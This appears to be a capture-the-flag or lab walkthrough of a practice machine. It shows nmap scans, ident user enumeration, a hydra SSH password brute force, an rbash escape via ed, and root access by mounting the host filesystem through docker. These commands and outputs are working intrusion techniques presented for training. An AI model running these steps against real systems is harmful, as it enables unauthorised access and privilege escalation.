First Enumeration with nmap 

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v <IP> -Pn`

```
# Nmap 7.93 scan initiated Fri Dec 30 07:22:03 2022 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.108.60
Nmap scan report for 192.168.108.60
Host is up (0.16s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
113/tcp   open   ident
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Dec 30 07:22:40 2022 -- 1 IP address (1 host up) scanned in 36.84 seconds
```

Good we know ports that are available, let's run nmap default scripts to know th services running on it

```
# Nmap 7.93 scan initiated Fri Dec 30 07:24:48 2022 as: nmap -sC -sV -oN normal.tcp -p 22,53,113,8080,10000 -Pn 192.168.108.60                                 [37/40]
Nmap scan report for 192.168.108.60
Host is up (0.32s latency).                                                        
                                                                                   
PORT      STATE  SERVICE           VERSION                                
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:                                                                     
|   2048 754c0201fa1e9fcce47b52feba3685a9 (RSA)                           
|   256 b76f9c2bbffb0462f418c938f43d6b2b (ECDSA)                          
|_  256 987fb640cebbb557d5d13c65727487c3 (ED25519)                        
|_auth-owners: root                                                                
113/tcp   open   ident             FreeBSD identd                         
|_auth-owners: nobody                                                              
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-title: Redmine                                                              
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)               
| http-robots.txt: 4 disallowed entries                                            
|_/issues/gantt /issues/calendar /activity /search                        
10000/tcp open   snet-sensor-mgmt?                                                 
| fingerprint-strings:                                                             
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSe
ssionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:  
|     HTTP/1.1 400 Bad Request                                                     
|     Connection: close                                                            
|   FourOhFourRequest:                                                             
|     HTTP/1.1 200 OK                                                              
|     Content-Type: text/plain                                                     
|     Date: Fri, 30 Dec 2022 06:25:07 GMT                                 
|     Connection: close                                                            
|     Hello World                                                                  
|   GetRequest, HTTPOptions:                                                       
|     HTTP/1.1 200 OK                                                                                                                                                 
|     Content-Type: text/plain
|     Date: Fri, 30 Dec 2022 06:24:57 GMT                                                                                                                             
|     Connection: close                                                                                                                                               
|_    Hello World
|_auth-owners: eleanor                                                             
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
vice :
SF-Port10000-TCP:V=7.93%I=7%D=12/30%Time=63AE8439%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\
SF:nDate:\x20Fri,\x2030\x20Dec\x202022\x2006:24:57\x20GMT\r\nConnection:\x
SF:20close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x2
SF:0OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2030\x20Dec\x20202
SF:2\x2006:24:57\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\n")%
SF:r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusReques
SF:tTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n
SF:\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TLSSession
SF:Req,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,71,"
SF:HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\
SF:x2030\x20Dec\x202022\x2006:25:07\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:Hello\x20World\n")%r(LPDString,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LDAPBindReq,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SI
SF:POptions,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close
SF:\r\n\r\n")%r(LANDesk-RC,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(TerminalServer,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 30 07:25:45 2022 -- 1 IP address (1 host up) scanned in 57.24 seconds
```

Now we know what services are running, let's start by enumerating port 113, ident.
ident-user-enum is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system.
This can help to prioritise target service during a pentest (you might want to attack services running as root first).  Alternatively, the list of usernames gathered can be used for password guessing attacks on other network services.
How to install: `sudo apt-get install ident-user-enum`. let run it againt the target and see what we get.

`ident-user-enum <IP> 22 113 8080 10000`

![image](https://user-images.githubusercontent.com/87468669/210043364-bc559f23-acb7-466f-8ec2-1c21bce5515f.png)

cool we can see the available users, which is `root & eleanor` let's bruteforce the ssh password for user eleanor using hydra.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Peppo]
└─$ hydra -l eleanor -P /usr/share/wordlists/rockyou.txt 192.168.108.60 -t 10 ssh -e nsr
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-30 08:30:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344402 login tries (l:1/p:14344402), ~1434441 tries per task
[DATA] attacking ssh://192.168.108.60:22/
[22][ssh] host: 192.168.108.60   login: eleanor   password: eleanor
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-30 08:30:41
```

Bull's eye we got the password, let's ssh.

![image](https://user-images.githubusercontent.com/87468669/210045797-36066132-c2dc-40a5-9b7c-32e9ae4de3e4.png)

Logged in ssh, now let's escalate privs 

![image](https://user-images.githubusercontent.com/87468669/210173315-a78af789-df7a-46d4-ba0e-612bd485e1fd.png)

Omg we have a restricted shell... Let's break out of the rbash

```
eleanor@peppo:~$ ed
!'/bin/bash'
eleanor@peppo:~$ id
bash: id: command not found
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
eleanor@peppo:~$ 
eleanor@peppo:~$ export PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
eleanor@peppo:~$ 
```

![image](https://user-images.githubusercontent.com/87468669/210173463-f1ab6fab-106c-42de-8f68-30715dfbc6e5.png)

Now we broke out of rbash, And typing the command `id` we can see the user eleanor is in the docker group let's escalate the docker to get root.

```
eleanor@peppo:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
326cfee15738        postgres            "docker-entrypoint.s…"   2 years ago         Up 4 months         0.0.0.0:5432->5432/tcp   postgres
71aa857fe988        redmine             "/docker-entrypoint.…"   2 years ago         Up 4 months         0.0.0.0:8080->3000/tcp   redmine
eleanor@peppo:~$ docker run -v /:/mnt --rm -it redmine chroot /mnt bash
```

![image](https://user-images.githubusercontent.com/87468669/210173661-0c22276b-9016-4f3f-b0e8-536c8dfc1ba0.png)

Boom!!! we got root🤠😎
